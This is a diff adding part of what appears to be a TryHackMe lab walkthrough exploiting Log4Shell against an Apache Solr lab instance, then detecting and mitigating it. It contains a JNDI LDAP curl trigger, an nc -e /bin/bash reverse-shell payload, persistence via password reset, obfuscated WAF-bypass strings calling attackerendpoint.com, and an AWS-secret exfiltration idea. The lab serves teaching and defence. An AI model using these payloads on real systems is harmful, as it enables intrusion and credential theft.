@@ -185,4 +185,168 @@ Create and move into a new directory where you might host this payload. First, c
 
 ![image](https://user-images.githubusercontent.com/95479102/146746718-74d29e4f-b6ff-4e9e-9b86-8ca3a3b7caf3.png)
 
+Modify your attacker IP address and port number as appropriate (we are using 9999 as the example port number as before).
 
+For this payload, you can see we will execute a command on the target, specifically nc -e /bin/bash to call back to our our attacker machine. This target has been configured with ncat for ease of exploitation, though you are more than welcome to experiment with other payloads.
+
+Compile your payload with javac Exploit.java -source 8 -target 8 and verify it succeeded by running the ls command and finding a newly created Exploit.class file; remove "-source 8 -target 8" from command if not using attackbox.
+Compile Java exploit code
+          
+attackbox@tryhackme$ javac Exploit.java -source 8 -target 8
+
+![image](https://user-images.githubusercontent.com/95479102/147379175-e92ef9bc-30ac-4ad5-9e53-d6331d9f3046.png)
+
+With your payload created and compiled, you can now host it by spinning up a temporary HTTP server.  
+        
+![image](https://user-images.githubusercontent.com/95479102/147379186-7f466867-d425-42a1-823d-4666e8ed33cf.png)
+
+Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal -- next prepare a netcat listener to catch your reverse shell in yet another new terminal window:
+Prepare your netcat listener
+
+![image](https://user-images.githubusercontent.com/95479102/147379233-b1521906-ecc1-420e-8bbc-16cffba5dec5.png)
+        
+Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:
+           
+attackbox@tryhackme$ curl 'http://10.10.149.239:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:1389/Exploit\}'
+
+![image](https://user-images.githubusercontent.com/95479102/147379386-96750501-45e5-4879-9929-c1b84fbb7c16.png)
+
+You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability. 
+
+At this point, a threat actor can realistically do whatever they would like with the victim -- whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other post-exploitation -- potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware. 
+
+All it took was a single string of text, and a little bit of set up with freely available tooling. This is precisely why the Internet has been on fire during the weekend of December 9th, 2021. 
+
+![image](https://user-images.githubusercontent.com/95479102/147379410-352ff34a-9702-4f4a-9bec-c7b84d18d3fd.png)
+
+![image](https://user-images.githubusercontent.com/95479102/147379433-b7c783fe-d014-4766-82a6-62afe5450b3e.png)
+
+![image](https://user-images.githubusercontent.com/95479102/147379441-11b16ac8-74e2-44e9-836f-8c7214d891a3.png)
+
+Now that you have gained a reverse shell connection on the victim machine, you can continue to take any action you might like.
+
+To better understand this log4j vulnerability, let's grant ourselves "better access" so we can explore the machine, analyze the affected logs, and even mitigate the vulnerability!
+
+You may have noticed from your earlier nmap scan that SSH (port 22) was open on the host. We did not know any usernames or passwords at the point, so trying against that protocol would be useless -- but now that you have code execution as a user, you could potentially add private keys or change passwords. 
+
+If you would like to "stabilize your shell" for easier ability in typing commands, you can use the usual upgrade trick (assuming you are running in a bash shell. If you are running within zsh, you will need to have started your netcat listener within a bash subshell... it should be easy enough to re-exploit):
+
+(on the reverse shell) python3 -c "import pty; pty.spawn('/bin/bash')"
+
+(press on your keyboard) Ctrl+Z
+
+(press on your keyboard) Enter
+
+(on your local host) stty raw -echo
+
+(on your local host) fg (you will not see your keystrokes -- trust yourself and hit Enter)
+
+(press on your keyboard) Enter
+
+(press on your keyboard) Enter
+
+(on the reverse shell) export TERM=xterm
+
+You now have a stable shell, where you can safely use the left-and-right arrow keys to move around your input, up-and-down arrow keys to revisit command history, Tab for autocomplete and safely Ctrl+C to stop running programs!
+
+![image](https://user-images.githubusercontent.com/95479102/147379647-9840f2d1-e514-41eb-9e38-db5fae165267.png)
+
+Check super user permissions. For your convenience in this exercise, your user should have sudo privileges without the need for any password.
+
+![image](https://user-images.githubusercontent.com/95479102/147379658-d88dde34-7362-4477-8627-f9c954500b5e.png)
+
+If you would like to grant yourself persistence and access into the machine via SSH, momentarily become root and change the password for the solr user to one of your choosing. This way, you can SSH in as needed!
+
+![image](https://user-images.githubusercontent.com/95479102/147379676-7d8add9b-cf11-4a3d-a8f5-60ca37b6a14f.png)
+
+In another terminal window, SSH into the machine with your new credentials.
+
+![image](https://user-images.githubusercontent.com/95479102/147379693-7b0c094c-67c9-4e8a-b848-b51df440a7b2.png)
+
+Unfortunately, finding applications vulnerable to CVE-2021-44228 "Log4Shell" is hard.
+
+Detecting exploitation might be even harder, considering the unlimited amount of potential bypasses. 
+
+With that said, the information security community has seen an incredible outpouring of effort and support to develop tooling, script, and code to better constrain this threat. While this room won't showcase every technique in detail, you can again find an enormous amount of resources online.
+
+Below are snippets that might help either effort:
+
+    https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
+    https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
+    https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
+    https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
+    https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)
+
+As a reminder, a massive resource is available here: 
+
+https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
+
+To explore our own logs, use your SSH connection or reverse shell to move into the directory where the Solr logs are stored.
+
+![image](https://user-images.githubusercontent.com/95479102/147379715-bcbc7283-0e68-49a4-b565-bd64e427488f.png)
+
+Review the log file that you know is affected by the log4j vulnerability.
+
+Notice your JNDI attack syntax included in the log entries! If you would like to experiment more, try some of the bypasses mentioned in the Task below.
+
+![image](https://user-images.githubusercontent.com/95479102/147379732-4f276982-5449-461d-adad-8ed8b4d0f802.png)
+
+The JNDI payload that we have showcased is the standard and "typical" syntax for performing this attack.
+
+If you are a penetration tester or a red teamer, this syntax might be caught by web application firewalls (WAFs) or easily detected. If you are a blue teamer or incident responder, you should be actively hunting for and detecting that syntax.
+
+Because this attack leverages log4j, the payload can ultimately access all of the same expansion, substitution, and templating tricks that the package makes available. This means that a threat actor could use any sort of tricks to hide, mask, or obfuscate the payload.
+
+With that in mind, there are honestly an unlimited number of bypasses to sneak in this syntax. While we will not be diving into the details in this exercise, you are encouraged to play with them in this environment. Read them carefully to understand what tricks are being used to masquerade the original syntax.
+
+There are numerous resources online that showcase some examples of these bypasses, with a few offered below:
+
+${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
+
+${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
+
+${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
+
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
+
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
+
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
+
+${${::-j}ndi:rmi://attackerendpoint.com/}
+
+Note the use of the rmi:// protocol in the last one. This is also another valid technique that can be used with the marshalsec utility -- feel free to experiment!
+
+Additionally, within the log4j engine, you can expand arbitrary environment variables (if this wasn't already bad enough). Consider the damage that could be done even with remote code execution, but a simple LDAP connection and exfiltration of ${env:AWS_SECRET_ACCESS_KEY}
+
+For other techniques, you are strongly encouraged t do your own research. There is a significant amount of information being shared in this Reddit thread: https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
+
+Gentle reminder, use this knowledge for good. You know what they say... great power, great responsibility and all.
+
+Now that you have acted as the adversary for a little bit, please take off your hacker hat and let's mitigate the vulnerability on this vulnerable machine! Review the mitigation techniques suggested on the Apache Solr website. https://solr.apache.org/security.html
+
+One option is to manually modify the solr.in.sh file with a specific syntax. Let's go down that route for the sake of showcasing this defensive tactic.
+
+If you want to directly SSH into the machine, the credentials are: vagrant as the username, and vagrant as the password.
+
+![image](https://user-images.githubusercontent.com/95479102/147380021-0fc0d91f-69ee-4247-8035-4ddccbd9f74f.png)
+
+he Apache Solr website Security page explains that you can add this specific syntax to the solr.in.sh file:
+
+SOLR_OPTS="$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true"
+
+Modify the solr.in.sh file with a text editor of your choice. You will need a sudo prefix to borrow root privileges if you are not already root
+
+![image](https://user-images.githubusercontent.com/95479102/147380048-cb2a906e-beb4-4872-8a17-62c73dd8bba2.png)
+
+Now that the configuration file has been modified, the service still needs to be restarted for the changed to take effect.
+
+This process may vary between installations, but for this server, you can restart the service with this syntax:
+
+![image](https://user-images.githubusercontent.com/95479102/147380087-034ebf94-a37f-4577-a2f4-d9ab1e5903b1.png)
+
+To validate that the patch has taken place, start another netcat listener as you had before, and spin up your temporary LDAP referral server and HTTP server (again in separate terminals). 
+
+You will want to recreate the same setup to re-exploit the machine.
+
+You should see that no request is made to your temporary LDAP server, consequently no request is made to your HTTP server, and... no reverse shell is sent back to your netcat listener!
